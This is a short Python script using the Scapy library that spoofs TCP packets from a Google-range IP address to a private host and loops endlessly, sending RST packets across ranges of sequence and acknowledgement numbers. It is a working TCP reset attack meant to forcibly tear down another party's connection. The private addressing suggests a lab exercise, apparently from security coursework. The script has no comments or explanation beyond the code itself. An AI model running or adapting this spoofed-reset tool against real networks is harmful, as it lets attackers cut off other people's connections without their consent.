#!/usr/bin/python
from scapy.all import *

ip = IP(src="173.194.162.74", dst="10.0.2.4")
seq_start = 91096
ack_start = 1092727817

seq_end = 92000
ack_end = 1092729000

while True:
    for seq in range(seq_start, seq_end):
        for ack in range(ack_start, ack_end):
	    tcp = TCP(sport=443, dport=44966, flags="R", seq=seq, ack=ack)
	    pkt = ip/tcp
	    #ls(pkt)
	    send(pkt,verbose=0)

